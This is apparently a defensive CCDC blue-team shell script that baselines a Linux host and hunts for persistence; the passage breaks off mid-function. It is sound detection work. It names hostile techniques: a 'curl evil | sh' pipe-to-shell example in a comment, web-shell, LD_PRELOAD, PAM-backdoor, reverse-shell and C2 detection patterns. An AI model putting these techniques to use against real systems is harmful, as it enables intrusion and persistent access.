#!/bin/sh
# first30.sh - the Linux "first 30 minutes" kit for CCDC.
#
# NEW PLAYER? Run it with no mode and pick from the menu:
#     sudo sh first30.sh
# The menu says what each choice does and whether it changes anything on the box.
# Learn mode (on in the menu) prints the plain command behind every check, so you
# can run it yourself and see how it works. From the command line:
#     sudo sh first30.sh learn hunt
#
if [ -z "$FIRST30_CLEAN" ] && [ -f "$0" ] && [ -x /usr/bin/env ]; then
    exec /usr/bin/env -i FIRST30_CLEAN=1 PATH=/usr/sbin:/usr/bin:/sbin:/bin \
        HOME="${HOME:-/root}" TERM="${TERM:-dumb}" SYSTEMD_PAGER=cat PAGER=cat \
        VAULT="${VAULT:-/root/bk}" MAXMB="${MAXMB:-500}" OURNETS="${OURNETS:-}" \
        LEARN="${LEARN:-}" SUDO_USER="${SUDO_USER:-}" \
        SSH_CLIENT="${SSH_CLIENT:-}" /bin/sh "$0" "$@"
fi
PATH=/usr/sbin:/usr/bin:/sbin:/bin
export PATH
unset LD_PRELOAD LD_LIBRARY_PATH

VAULT=${VAULT:-/root/bk}
MAXMB=${MAXMB:-500}
HOST=$(hostname 2>/dev/null || cat /etc/hostname 2>/dev/null || echo host)
TS=$(date +%m%d-%H%M%S)
BASE="$VAULT/baseline_$HOST.txt"
NOTES="$VAULT/notes.txt"
SCRIPT=''
[ -f "$0" ] && SCRIPT=$(readlink -f "$0" 2>/dev/null)
LC_ALL=C
export LC_ALL

# Game-day settings saved in the vault (root only): your networks and the bait.
if [ -z "$OURNETS" ] && [ -s "$VAULT/ournets.txt" ]; then OURNETS=$(cat "$VAULT/ournets.txt" 2>/dev/null); fi
BAIT='' BAITUSER=''
if [ -s "$VAULT/bait.txt" ]; then read -r BAIT BAITUSER _ < "$VAULT/bait.txt" 2>/dev/null; fi

say() { printf '%s\n' "$*"; }
have() { command -v "$1" >/dev/null 2>&1; }
tmo() { case "$1" in ""|*[!0-9]*) tm_s=10 ;; *) tm_s=$1; shift ;; esac; if have timeout && [ -x "$(command -v "$1" 2>/dev/null)" ]; then timeout "$tm_s" "$@"; else "$@"; fi; }
now_utc() { date -u '+%Y-%m-%d %H:%M UTC'; }

# Everything this script prints goes through this filter. Red team can put hidden
# characters in file names, process names and log lines: a carriage return can make
# "curl evil | sh" look like a harmless comment, and escape codes can rewrite the
# screen. Here every hidden or non-English character shows as a ?.
sanitize() { sed 's/[^[:print:][:blank:]]/?/g'; }

# A short fingerprint of a file, like 3f9a-21c0-77de. Write the baseline's seal on
# paper. If it ever changes, someone edited the baseline to hide what they did.
seal() {
    if have sha256sum; then h=$(sha256sum "$1" 2>/dev/null | cut -c1-12)
    else h=$(cksum "$1" 2>/dev/null | awk '{print $1}'); fi
    printf '%s\n' "$h" | sed 's/^\(....\)\(....\)\(....\)$/\1-\2-\3/'
}

# Did an installed package put this file here? 0 = yes, 1 = no, 2 = cannot tell.
# Red team's fake services and libraries came from no package at all.
PKGLIST=''
from_package() {
    if [ -z "$PKGLIST" ]; then
        PKGLIST="$VAULT/.pkgfiles.$$"
        if [ -d /var/lib/dpkg/info ]; then cat /var/lib/dpkg/info/*.list > "$PKGLIST" 2>/dev/null
        elif have rpm; then rpm -qal > "$PKGLIST" 2>/dev/null
        elif [ -f /lib/apk/db/installed ]; then
            awk '/^F:/ {d = substr($0, 3)} /^R:/ {print "/" d "/" substr($0, 3)}' /lib/apk/db/installed > "$PKGLIST" 2>/dev/null
        elif have pacman; then pacman -Qlq 2>/dev/null | sed 's:/$::' > "$PKGLIST"
        elif [ -d /var/lib/pkgtools/packages ] || [ -d /var/log/packages ]; then
            pl_d=/var/lib/pkgtools/packages; [ -d "$pl_d" ] || pl_d=/var/log/packages
            for pl_f in "$pl_d"/*; do [ -f "$pl_f" ] && sed '1,/^FILE LIST:/d; s:^:/:; s:/$::' "$pl_f"; done > "$PKGLIST" 2>/dev/null
        else : > "$PKGLIST"; fi
    fi
    [ -s "$PKGLIST" ] || return 2
    case "$1" in /snap/*|/var/lib/snapd/*|/var/lib/flatpak/*) return 0 ;; esac
    fp_r=$(readlink -f "$1" 2>/dev/null)
    [ -n "$fp_r" ] || fp_r=$1
    for fp_c in "$1" "$fp_r" "${fp_r#/usr}" "/usr$fp_r"; do
        grep -F -x -q -- "$fp_c" "$PKGLIST" && return 0
    done
    return 1
}

# The package that owns a file, and the command that puts a missing file back.
pkg_owner() {
    po_n=''
    if have dpkg; then
        for po_c in "$1" "${1#/usr}" "/usr$1"; do
            po_n=$(dpkg -S "$po_c" 2>/dev/null | grep -v '^diversion' | head -1 | cut -d: -f1)
            [ -n "$po_n" ] && break
        done
    elif have rpm; then
        po_n=$(rpm -qf --qf '%{NAME}\n' "$1" 2>/dev/null | grep -v 'not owned' | head -1)
    elif have apk; then
        po_n=$(apk info --who-owns -q "$1" 2>/dev/null | head -1)
    elif have pacman; then
        po_n=$(pacman -Qoq "$1" 2>/dev/null | head -1)
    elif [ -d /var/lib/pkgtools/packages ] || [ -d /var/log/packages ]; then
        po_d=/var/lib/pkgtools/packages; [ -d "$po_d" ] || po_d=/var/log/packages
        po_n=$(grep -l -x -F "${1#/}" "$po_d"/* 2>/dev/null | head -1 | sed 's|.*/||; s/-[^-]*-[^-]*-[^-]*$//')
    fi
    [ -n "$po_n" ] && say "$po_n"
}
reinstall_cmd() {
    rc_n=$(pkg_owner "$1")
    [ -n "$rc_n" ] || return 1
    if have apt-get; then say "apt-get install --reinstall $rc_n"
    elif have dnf; then say "dnf reinstall $rc_n"
    elif have yum; then say "yum reinstall $rc_n"
    elif have apk; then say "apk fix -r $rc_n"
    elif have pacman; then say "pacman -S --noconfirm $rc_n"
    elif have slackpkg; then say "slackpkg reinstall $rc_n"
    else say "reinstall the $rc_n package"; fi
}

need_root() {
    if [ "$(id -u)" != "0" ]; then
        say "Run this as root. Use: sudo sh first30.sh   (or su - first)"
        exit 1
    fi
    umask 077
    if [ -L "$VAULT" ]; then
        say "$VAULT is a link to somewhere else. Someone set a trap: tell your lead, and use VAULT=/other/dir."
        exit 1
    fi
    mkdir -p "$VAULT" && chmod 700 "$VAULT"
    vault_guard
    trap 'rm -f "$VAULT/.pkgfiles.$$" "$VAULT/.c2samples.$$" "$VAULT/.ptab.$$" "$VAULT/.stamp_new.$$" "$VAULT/.trace.$$" "$VAULT"/.v5_*."$$" "$VAULT/.hooks.$$" "$VAULT/.decoypaths.$$" "$VAULT/.scrub.$$" "$VAULT/.auditconf.$$"' 0
    trap 'exit 1' INT TERM
}

# A line in the team notes, written by this script when it changes something, so
# the team's own changes are easy to tell apart from red team's in the hunt.
autonote() {
    [ -d "$VAULT" ] || return 0
    printf '%s  %s  first30: %s\n' "$(now_utc)" "$HOST" "$*" >> "$NOTES"
    chmod 600 "$NOTES" 2>/dev/null
}

# ---------------------------------------------------------------- output helpers
# Every check starts with sec. flag marks the check as "something to look at" for
# the summary at the end. nxt prints what to do about it.
FOUND='' NFOUND=0 CUR=''
sec() {
    CUR=$2
    say ""
    say "== $2"
    [ -n "$LEARN" ] && learn "$1"
}
flag() {
    case "$FOUND" in *"|$CUR|"*) return 0 ;; esac
    FOUND="$FOUND|$CUR|"
    NFOUND=$((NFOUND + 1))
}
ok() { say "  ok: $*"; }
nxt() { say "  Next: $*"; }

# Learn mode: the plain command you can type yourself, and why the check matters.
learn() {
    l_c='' l_w=''
    case "$1" in
        self) l_c='cat /etc/ld.so.preload   (should be missing or empty)    and    ldd /bin/true'
              l_w='a library listed there loads into every program, this script'"'"'s tools too, and can hide things from them.' ;;
        last) l_c='ls -t /root/bk   (snapshots, newest first)    then    diff <older snapshot> <newer snapshot>'
              l_w='shows only the newest changes, so what red team did 10 minutes ago is not buried under the morning.' ;;
        files) l_c='find /etc /root /home -cmin -30 -type f   (files changed in the last 30 minutes)'
               l_w='-cmin uses the change time the kernel keeps. touch can fake the modified time, not this one.' ;;
        base) l_c='diff /root/bk/baseline_<host>.txt <newest snapshot>'
              l_w='everything that changed since the start of the game. Long by now; read part 1 first.' ;;
        rat) l_c='ps -ef    and    systemctl list-units --type=service    (look for mesh, anydesk, rustdesk, vnc)'
             l_w='a remote-access tool is a way back in that survives password changes. It was the way in at the invitational.' ;;
        web) l_c='grep -r -l "shell_exec(" /var/www'
             l_w='a web shell runs any command typed into a web page, as the web server'"'"'s account.' ;;
        temp) l_c='ls -la /tmp /var/tmp /dev/shm'
              l_w='droppers and agents land here, often with a dot in front of the name so plain ls hides them.' ;;
        exe) l_c='ls -l /proc/<pid>/exe   (the program file a process runs)'
             l_w='an agent whose file is deleted, or sits in /tmp, is hiding. The imix agent ran as /tmp/.sysupd.bin.' ;;
        procs) l_c='ls -l /proc/<pid>/exe    then    dpkg -S <that path>    (Red Hat: rpm -qf <that path>)'
               l_w='the system'"'"'s programs come from packages. A program from no package was put there by a person.' ;;
        svc) l_c='systemctl cat <service>    then    dpkg -S <its program>    (Red Hat: rpm -qf)'
             l_w='red team gave fake services normal names. Where the program came from gives them away.' ;;
        kthread) l_c='ps -ef   (real kernel threads are in [brackets] and ls -l /proc/<pid>/exe shows no file)'
                 l_w='naming a program [kworker] makes people skip over it.' ;;
        shells) l_c='ls -l /proc/<pid>/fd   (0 and 1 pointing to socket:[...] = its keyboard and screen are the network)'
                l_w='that is what a reverse shell or a bind shell looks like from the inside.' ;;
        sniff) l_c='cat /proc/net/packet   (every program reading raw traffic; the last column is its socket number)'
               l_w='a backdoor that reads raw packets (like BPFDoor) opens no port, so ss -l and port scans never show it.' ;;
        rootkit) l_c='ls /proc  vs  ps -e,    ss -tln  vs  cat /proc/net/tcp,    lsmod  vs  ls /sys/module'
                 l_w='a rootkit can fool one way of looking, rarely all of them. When two views disagree, something hides.' ;;
        pam) l_c='grep -r pam_exec /etc/pam.d'
             l_w='PAM decides who may log in. One added line can run a password stealer or let anyone in.' ;;
        pkg) l_c='dpkg --verify openssh-server    (Red Hat: rpm -V openssh-server; no output = every file matches)'
             l_w='a swapped sshd, pam_deny.so or ps looks just like the real one, except for its checksum.' ;;
        preload) l_c='grep -r LD_PRELOAD /etc/systemd /etc/environment'
                 l_w='LD_PRELOAD loads a library into a program first. That is how a library got into sshd at the invitational.' ;;
        sudo) l_c='cat /etc/sudoers    and    ls /etc/sudoers.d'
              l_w='one file in sudoers.d gave every domain user root at the invitational.' ;;
        accounts) l_c='cat /etc/passwd   (3rd field 0 = root power; the last field is the shell)'
                  l_w='an extra UID 0 account, or a service account with a shell, is a quiet way back in.' ;;
        keys) l_c='cat /root/.ssh/authorized_keys    and    sshd -T | grep -i authorizedkeys'
              l_w='a planted key logs in with no password, even after every password is changed.' ;;
        sshd) l_c='sshd -T   (the settings sshd really uses, after every include file)'
              l_w='one setting can let anyone in (empty passwords) or trust red team'"'"'s key for every account.' ;;
        logins) l_c='who    and    last -a | head    and    grep Accepted /var/log/auth.log   (Red Hat: /var/log/secure)'
                l_w='red team logs in with real accounts (T1078). Know who is on your box, and from where.' ;;
        jobs) l_c='crontab -l    ls /etc/cron.d    atq    systemctl list-timers'
              l_w='a scheduled job brings a backdoor back after you remove it.' ;;
        shellinit) l_c='cat /root/.bashrc    and    type sudo   (type tells you if sudo is really an alias or a function)'
                   l_w='an alias or function named sudo can steal your password while you type it.' ;;
        tamper) l_c='lsattr /etc/passwd   (an i means locked; chattr -i <file> unlocks it)'
                l_w='red team locks their backdoor files, and sometimes yours, so even root cannot change them.' ;;
        logs) l_c='ls -l /var/log    and    ls -l /root/.bash_history   (-> /dev/null means history is thrown away)'
              l_w='cleared logs hide what happened (T1070). A log that got smaller since the last hunt was cut.' ;;
        c2) l_c='ss -tnp   (each line: the program, and the address it is talking to)'
            l_w='an agent has to call home. A program that keeps calling the same outside address is the one to check.' ;;
        ci) l_c='ps -ef | grep -i runner    and    docker ps'
            l_w='a CI runner runs whatever the repo tells it to. A host-level container is root on this box.' ;;
        ransom) l_c='find /home /var/www -name "*.locked"'
                l_w='locked files and ransom notes (T1486) mean you need your backups now.' ;;
        bait) l_c='ausearch -k bait -i'
              l_w='nobody on your team opens the bait. If someone did, it was red team, and the log says who.' ;;
        spam) l_c='ls -l /usr/bin/wall /usr/bin/write   (---------- = turned off)    and    grep TracerPid /proc/<pid>/status'
              l_w='wall and write flood every terminal. A program tracing your shell, or reading /dev/vcs, sees what you type.' ;;
        audit) l_c='auditctl -s   (enabled 2 = locked)    and    ausearch -k identity -i'
               l_w='red team took over auditd at the invitational. If it is off or unlocked, they can blind you.' ;;
        ips) l_c='ip -4 addr show   (look for the word secondary)    and    kubectl get svc -A'
             l_w='a box can answer on several addresses. The packet documentation must list every one, and a new one can steal traffic.' ;;
        clock) l_c='date -u ; timedatectl ; chronyc tracking'
               l_w='Kerberos refuses a login when the clocks differ by more than 5 minutes. Moving a clock breaks every domain login at once.' ;;
        polkit) l_c='grep -r "Result.YES" /etc/polkit-1/rules.d /usr/share/polkit-1/rules.d ; pkexec id   (as a normal user: it must ask)'
                l_w='polkit decides who may run things as root without sudo. One rule file gives a user root with no password.' ;;
        db) l_c='mysql -e "select user,host,Super_priv,Grant_priv from mysql.user; select * from mysql.func; select @@secure_file_priv"'
            l_w='a database admin account, a trigger or a loaded library survives every password change on the box itself.' ;;
        k8s2) l_c='kubectl get mutatingwebhookconfigurations,validatingwebhookconfigurations ; ls /var/lib/rancher/k3s/server/manifests'
              l_w='a webhook can change every pod as it is created, and k3s re-applies every file in its manifests folder.' ;;
        trap) l_c='cat /proc/self/mountinfo | grep -E " /proc/[0-9]+| /etc/"    and    find /root/bk -type l'
              l_w='a mount on top of /proc/<pid> hides a process from ps. A link inside the vault makes this script overwrite another file.' ;;
        sshmatch) l_c='grep -n -i -A6 "^ *match" /etc/ssh/sshd_config /etc/ssh/sshd_config.d/*   then   sshd -T -C user=<name>,host=x,addr=<address>'
                  l_w='sshd -T shows the settings for everyone. A Match block changes them for one user or address, and stays hidden.' ;;
        pam2) l_c='grep -r -n -E "sufficient|success=" /etc/pam.d | grep -v "^#"'
              l_w='PAM stops at the first "sufficient" line that passes. pam_permit always passes, so one line removes the password check.' ;;
        hooks) l_c='grep -r "RUN+=" /etc/udev/rules.d ; ls /etc/systemd/system-generators /etc/NetworkManager/dispatcher.d /etc/update-motd.d ; grep -r Invoke /etc/apt/apt.conf.d'
               l_w='these run a program on an event, as root, and are not cron or a service, so most hunts never look there.' ;;
        udp) l_c='ss -uanp ; ip -d link show | grep -E "wireguard|tun|gre|vxlan" ; ps aux | grep "ssh .*-[RLD]"'
             l_w='C2 does not need TCP. UDP, a tunnel device, or a forward through SSH carries it past a TCP-only check.' ;;
        mem) l_c='ls -l /proc/*/exe 2>/dev/null | grep -E "memfd|deleted|/dev/shm"'
             l_w='a program started from memory has no file to find on disk. Its only copy is /proc/<pid>/exe while it runs.' ;;
        decoy) l_c='stat -c "%x %n" <the decoy>   (the Access time; never cat it)'
               l_w='nothing real reads the decoy, so a newer read time means someone is searching the box for passwords.' ;;
        plumbing) l_c='pgrep -a vault ; realm list ; grep -r -l -i binddn /etc /opt 2>/dev/null ; docker ps'
                  l_w='at Invitational 2, one changed password and one firewall flush broke several scored services at once.' ;;
        init) l_c='ls -la /etc/rc.d/rc.*  (Slackware)   rc-status -a ; ls /etc/local.d  (Alpine)   cat /etc/inittab'
              l_w='boxes without systemd start things from plain scripts. One added line brings red team back at every boot.' ;;
        mac) l_c='journalctl -k | grep DENIED    and    aa-status   (SELinux: ausearch -m avc -ts recent)'
             l_w='a planted AppArmor profile makes a service fail with "Permission denied", even for root.' ;;
        domain) l_c='realm list ; adcli testjoin ; sssctl domain-status <domain> ; getent passwd administrator@<domain>'
                l_w='a box in the domain fails when AD fails. Last year the DC fell and took Linux with it.' ;;
        k8s) l_c='kubectl get pods -A ; kubectl get cronjobs,daemonsets -A ; kubectl get clusterrolebindings'
             l_w='a CronJob or DaemonSet brings an agent back, and a privileged pod is root on the host.' ;;
        trip) l_c='journalctl -k | grep first30-trip   (each line has SRC=, the address that scanned you)'
              l_w='nothing uses those ports, so whoever touches them is looking around: that is red team.' ;;
        bugs) l_c='sudo -V | head -1 ; ssh -V ; uname -v ; grep anonymous_enable /etc/vsftpd.conf ; cat /etc/exports'
              l_w='red team scans for famous old holes and default settings first. Each fixed one is one less way in.' ;;
        *) return 0 ;;
    esac
    say "  [learn] by hand: $l_c"
    say "  [learn] why: $l_w"
}

# Plain names for the tags in the snapshot files, used when showing changes.
TAGMAP='PASSWD=account|UID0=root-level account|NOPASSWORD=no-password account|GROUP=admin group|SUDO=sudo rule|KEYS=SSH key file|CRON=cron job|AUTOSTART=autostart script|BOOTSCRIPT=boot script line|ENABLED=starts at boot|TIMER=timer|UNITFILE=service file|LISTEN=open port|SUID=SUID program|PRELOAD=ld.so.preload|PAM=PAM line|PROFILE=shell startup file|HOSTS=hosts file|SSHCONF=SSH config file|SSHD=SSH setting|MODULE=kernel module|DROPIN=service drop-in|UNITENV=service environment|ENVFILE=/etc/environment|CAPS=file capability|PAMMOD=PAM module file|LOCKED=locked file|RUNNING=running service|FW=firewall rule|FWNAT=firewall NAT rule|FWSTATE=firewall on/off|NFT=nftables rules|AUDITCFG=auditd file|AUDITSTATE=auditd on/off|PKG=package|PKGDB=package database|SWITCH=security switch|TAINT=kernel taint|NET=network setting|PASSWORD=password|ATJOB=at job|USERUNIT=user service|LINGER=user services at boot|BPF=eBPF program owner|BPFPIN=pinned eBPF|INETD=inetd service|WRAPPER=hosts.allow/deny'

show_diff() {   # $1 = NEW or GONE, $2 = snapshot lines
    printf '%s\n' "$2" | awk -v kind="$1" -v map="$TAGMAP" '
        BEGIN { n = split(map, m, "|"); for (i = 1; i <= n; i++) { j = index(m[i], "="); t[substr(m[i], 1, j - 1)] = substr(m[i], j + 1) } }
        NF { tag = $1; rest = substr($0, length($1) + 2); name = (tag in t) ? t[tag] : tag
             printf "  %-4s %-21s %s\n", kind, name, rest }'
}

count_by_tag() {   # one line like: open port 2, package 5
    printf '%s\n' "$1" | awk -v map="$TAGMAP" '
        BEGIN { n = split(map, m, "|"); for (i = 1; i <= n; i++) { j = index(m[i], "="); t[substr(m[i], 1, j - 1)] = substr(m[i], j + 1) } }
        NF { c[$1]++ }
        END { s = ""; for (k in c) s = s (s == "" ? "" : ", ") ((k in t) ? t[k] : k) " " c[k]; print s }'
}

# ---------------------------------------------------------------- process table
# One pass over /proc: "PID PROGRAM" for every process that has a program file.
# Kernel threads have none. Read once per run, used by several checks.
PTAB=''
proc_table() {
    PTAB="$VAULT/.ptab.$$"
    ls -l /proc/[0-9]*/exe 2>/dev/null | awk '{
        i = index($0, " /proc/"); if (!i) next
        r = substr($0, i + 7); p = r; sub(/\/.*/, "", p)
        j = index(r, " -> "); if (!j) next
        print p, substr(r, j + 4) }' > "$PTAB"
}

# PIDs that live in the same filesystem view as PID 1 (so not inside a container)
host_pids() {
    m1=$(readlink /proc/1/ns/mnt 2>/dev/null)
    ls -l /proc/[0-9]*/ns/mnt 2>/dev/null | awk -v m="$m1" '{
        i = index($0, " /proc/"); if (!i) next
        r = substr($0, i + 7); p = r; sub(/\/.*/, "", p)
        if (index(r, " -> " m)) print p }'
}

# ---------------------------------------------------------------- package checks
TOOL_PKGS='coreutils findutils grep sed gawk mawk dash bash procps iproute2 net-tools util-linux libc-bin kmod e2fsprogs'
SEC_PKGS='libpam-modules libpam-modules-bin libpam-runtime libpam0g openssh-server openssh-client sudo login passwd auditd systemd cron rsyslog'
RPM_TOOL_PKGS='coreutils findutils grep sed gawk bash procps-ng iproute net-tools util-linux glibc kmod e2fsprogs'
RPM_SEC_PKGS='pam openssh-server openssh-clients sudo shadow-utils audit systemd cronie rsyslog'
PAC_PKGS='pam openssh sudo shadow audit systemd cronie coreutils findutils grep sed gawk bash procps-ng iproute2 util-linux glibc kmod e2fsprogs'
# Which package checker this box has: dpkg, rpm, apk, pacman, or none (Slackware, Chrome OS, Tiny Core).
pkg_verify_kind() {
    if have dpkg; then say dpkg; elif have rpm; then say rpm
    elif have apk && [ -f /lib/apk/db/installed ]; then say apk; elif have pacman; then say pacman; else say none; fi
}

# Copy the checksum lists of the important packages into the vault at the baseline.
# Later checks use these copies, so editing the package database cannot hide a
# swapped program file.
save_md5sums() {
    have dpkg || return 0
    sm_d="$VAULT/md5sums_$HOST"
    mkdir -p "$sm_d"
    for sm_p in $TOOL_PKGS $SEC_PKGS; do
        sm_f=/var/lib/dpkg/info/$sm_p.md5sums
        [ -f "$sm_f" ] || sm_f=$(ls /var/lib/dpkg/info/"$sm_p":*.md5sums 2>/dev/null | head -1)
        [ -n "$sm_f" ] && [ -f "$sm_f" ] || continue
        cp "$sm_f" "$sm_d/$sm_p.md5sums"
        dpkg-query -W -f='${Version}' "$sm_p" > "$sm_d/$sm_p.version" 2>/dev/null
    done
    chmod -R go-rwx "$sm_d"
}

# Prints CHANGED / MISSING / CONFIG / PERMS lines for files that no longer match.
verify_pkgs() {
    if have dpkg; then
        for vp_p in "$@"; do
            vp_v=$(dpkg-query -W -f='${Status} ${Version}\n' "$vp_p" 2>/dev/null)
            case "$vp_v" in *'ok installed'*) ;; *) continue ;; esac
            vp_s="$VAULT/md5sums_$HOST/$vp_p.md5sums"
            if [ -s "$vp_s" ] && [ "${vp_v##* }" = "$(cat "$VAULT/md5sums_$HOST/$vp_p.version" 2>/dev/null)" ]; then
                (cd / && md5sum -c "$vp_s" 2>/dev/null) | awk '
                    /: OK$/ {next}
                    /: FAILED open or read$/ {sub(/: FAILED open or read$/, ""); print "MISSING: /" $0; next}
                    /: FAILED$/ {sub(/: FAILED$/, ""); print "CHANGED: /" $0}'
            else
                dpkg --verify "$vp_p" 2>/dev/null | awk '
                    $1 == "missing" {print "MISSING: " $NF; next}
                    $2 == "c" {print "CONFIG: " $NF; next}
                    {print "CHANGED: " $NF}'
            fi
        done
    elif have rpm; then
        rpm -V "$@" 2>/dev/null | grep -v 'is not installed' | awk '
            $1 == "missing" {print "MISSING: " $NF; next}
            $2 == "c" {print "CONFIG: " $NF; next}
            $1 ~ /[5S]/ {print "CHANGED: " $NF; next}
            $1 ~ /[MUG]/ {print "PERMS: " $NF}'
    elif have apk && [ -f /lib/apk/db/installed ]; then
        apk audit --system 2>/dev/null | awk '$1 == "U" {print "CHANGED: /" $2; next} $1 == "X" {print "MISSING: /" $2}'
    elif have pacman; then
        pacman -Qkk $PAC_PKGS 2>&1 | awk '/^backup file:/ {next}
            /checksum mismatch|Size mismatch/ {for (i = 1; i <= NF; i++) if ($i ~ /^\//) {print "CHANGED: " $i; break}; next}
            /No such file/ {for (i = 1; i <= NF; i++) if ($i ~ /^\//) {print "MISSING: " $i; break}}'
    fi | grep -v -E ' /usr/share/(doc|man|locale|info|lintian|help)/' |
        awk -v q="$QUIET_UNDO" 'BEGIN {while ((getline l < q) > 0) {split(l, a, " "); skip["PERMS: " a[2]] = 1}} !($0 in skip)'
}

# ---------------------------------------------------------------- snapshot
# Things that should not change during the day. hunt compares these to the last
# hunt and to the baseline. Every line starts with a tag so a change is easy to read.
find_sshd() {
    for s in "$(command -v sshd 2>/dev/null)" /usr/sbin/sshd /usr/local/sbin/sshd /run/current-system/sw/bin/sshd; do
        if [ -n "$s" ] && [ -x "$s" ]; then echo "$s"; return 0; fi
    done
    return 1
}

# Files with the immutable (i) or append-only (a) attribute. Red team locks their
# backdoors with chattr +i so nobody, not even root, can edit or delete them.
locked_files() {
    have lsattr || return 0
    { find /etc /root/.ssh /var/spool/cron /bin /sbin /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin \
          /lib/systemd/system /usr/lib/systemd/system -xdev \( -type f -o -type d \) -print0 2>/dev/null
      find /root /home /opt /srv /var/www -maxdepth 3 -xdev \
          \( -path "$VAULT" -o -path "${BAIT:-/nonexistent}" -o -path '/home/*/.cache' \) -prune -o \
          \( -type f -o -type d \) -print0 2>/dev/null
    } | xargs -0 lsattr -d 2>/dev/null |
        awk '$1 ~ /^[-a-zA-Z]+$/ && $1 ~ /[ia]/ {a = $1; $1 = ""; sub(/^ /, ""); print a, $0}' | sort -u
}

snapshot() {
    # the time makes every snapshot's seal different; lines starting with # are not compared
    say "# first30 snapshot of $HOST at $(date -u '+%Y-%m-%d %H:%M:%S UTC')"
    sed 's/^/PASSWD /' /etc/passwd
    awk -F: '$3==0 {print "UID0 " $1}' /etc/passwd
    if [ -r /etc/shadow ]; then
        awk -F: '$2=="" {print "NOPASSWORD " $1}' /etc/shadow
        # a short fingerprint of each password hash: shows any password change, and a
        # locked account that suddenly has a password
        awk -F: '{print $1, $2}' /etc/shadow | while read -r su sh; do
            say "PASSWORD $su $(printf '%s' "$sh" | sha256sum | cut -c1-8)"
        done
    fi
    for g in root sudo wheel admin adm docker lxd disk shadow; do
        grep "^$g:" /etc/group 2>/dev/null | sed 's/^/GROUP /'
    done
    for f in /etc/sudoers /etc/sudoers.d/*; do
        [ -f "$f" ] || continue
        grep -v '^[[:space:]]*$' "$f" | grep -v '^[[:space:]]*#[^i@]' | sed "s|^|SUDO $f: |"
    done
    # Key files in every account's home, plus /etc/ssh. No full-disk search, so a dead
    # NFS mount cannot hang it.
    awk -F: '{print $6}' /etc/passwd | sort -u | while read -r h; do
        for f in "$h"/.ssh/authorized_keys*; do
            [ -f "$f" ] && say "KEYS $(sha256sum "$f" 2>/dev/null | cut -c1-16) $f"
        done
    done
    find /etc/ssh -name 'authorized_keys*' -type f 2>/dev/null | while read -r f; do
        say "KEYS $(sha256sum "$f" 2>/dev/null | cut -c1-16) $f"
    done
    for f in /etc/crontab /etc/anacrontab /etc/cron.d/* /var/spool/cron/* /var/spool/cron/crontabs/*; do
        [ -f "$f" ] || continue
        grep -v '^[[:space:]]*$' "$f" | grep -v '^[[:space:]]*#' | sed "s|^|CRON $f: |"
    done
    for d in /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly /etc/init.d; do
        [ -d "$d" ] && ls -1 "$d" 2>/dev/null | sed "s|^|AUTOSTART $d/|"
    done
    for f in /etc/rc.local /opt/bootlocal.sh /opt/bootsync.sh; do
        [ -f "$f" ] && grep -v '^[[:space:]]*$' "$f" | grep -v '^[[:space:]]*#' | sed "s|^|BOOTSCRIPT $f: |"
    done
    for d in /var/spool/cron/atjobs /var/spool/at; do
        [ -d "$d" ] && ls -1 "$d" 2>/dev/null | grep -v -E '^(\.SEQ|spool)$' | sed "s|^|ATJOB $d/|"
    done
    if have systemctl; then
        systemctl list-unit-files --state=enabled --no-legend 2>/dev/null | awk '{print "ENABLED " $1}'
        systemctl list-timers --all --no-legend 2>/dev/null |
            awk '{for (i = 1; i <= NF; i++) if ($i ~ /\.timer$/) print "TIMER " $i}'
        for d in /etc/systemd/system /usr/local/lib/systemd/system; do
            [ -d "$d" ] || continue
            find "$d" -type f \( -name '*.service' -o -name '*.timer' \) 2>/dev/null | while read -r f; do
                say "UNITFILE $(sha256sum "$f" | cut -c1-16) $f"
            done
        done
        # user-level services start without root's crontab or /etc/systemd; with
        # "linger" they start at boot even when nobody is logged in
        for d in /etc/systemd/user /root/.config/systemd/user /home/*/.config/systemd/user; do
            [ -d "$d" ] || continue
            find "$d" \( -name '*.service' -o -name '*.timer' \) 2>/dev/null | while read -r f; do
                say "USERUNIT $(sha256sum "$f" 2>/dev/null | cut -c1-16) $f"
            done
        done
        [ -d /var/lib/systemd/linger ] && ls -1 /var/lib/systemd/linger 2>/dev/null | sed 's/^/LINGER /'
    fi
    [ -f /etc/inetd.conf ] && grep -v -E '^[[:space:]]*(#|$)' /etc/inetd.conf | sed 's/^/INETD /'
    [ -d /etc/xinetd.d ] && grep -l -i -E 'disable[[:space:]]*=[[:space:]]*no' /etc/xinetd.d/* 2>/dev/null | sed 's/^/INETD on: /'
    for f in /etc/hosts.allow /etc/hosts.deny; do
        [ -f "$f" ] && grep -v -E '^[[:space:]]*(#|$)' "$f" | sed "s|^|WRAPPER $f: |"
    done
    if have ss; then
        ss -tuln 2>/dev/null | awk 'NR > 1 {print "LISTEN " $1 " " $5}'
    elif have netstat; then
        netstat -tuln 2>/dev/null | awk '$1 ~ /^(tcp|udp)/ {print "LISTEN " $1 " " $4}'
    fi
    find / -xdev -perm -4000 -type f 2>/dev/null | sed 's/^/SUID /'
    [ -f /etc/ld.so.preload ] && sed 's/^/PRELOAD /' /etc/ld.so.preload
    grep -r -E 'pam_permit|pam_exec' /etc/pam.d 2>/dev/null | sed 's/^/PAM /'
    for f in /etc/profile /etc/bash.bashrc /etc/bashrc /etc/profile.d/* /root/.bashrc /root/.profile /root/.bash_profile; do
        [ -f "$f" ] && say "PROFILE $(sha256sum "$f" | cut -c1-16) $f"
    done
    grep -v '^[[:space:]]*$' /etc/hosts 2>/dev/null | grep -v '^[[:space:]]*#' | sed 's/^/HOSTS /'
    for f in /etc/ssh/sshd_config /etc/ssh/sshd_config.d/* /usr/local/etc/ssh/sshd_config; do
        [ -f "$f" ] && say "SSHCONF $(sha256sum "$f" | cut -c1-16) $f"
    done
    sshd_bin=$(find_sshd) && "$sshd_bin" -T 2>/dev/null |
        grep -i -E '^(permitrootlogin|passwordauthentication|pubkeyauthentication|authorizedkeysfile|authorizedkeyscommand|trustedusercakeys|permitemptypasswords|permituserenvironment) ' |
        sed 's/^/SSHD /'
    have lsmod && lsmod 2>/dev/null | awk 'NR > 1 {print "MODULE " $1}'
    say "TAINT $(cat /proc/sys/kernel/tainted 2>/dev/null)"
    # systemd drop-in overrides (a *.service.d/*.conf can inject LD_PRELOAD without
    # touching the main unit, which is how the marvin backdoor hid at the invitational)
    if have systemctl; then
        for d in /etc/systemd/system /usr/local/lib/systemd/system /run/systemd/system; do
            [ -d "$d" ] || continue
            find "$d" -type f -name '*.conf' 2>/dev/null | while read -r f; do
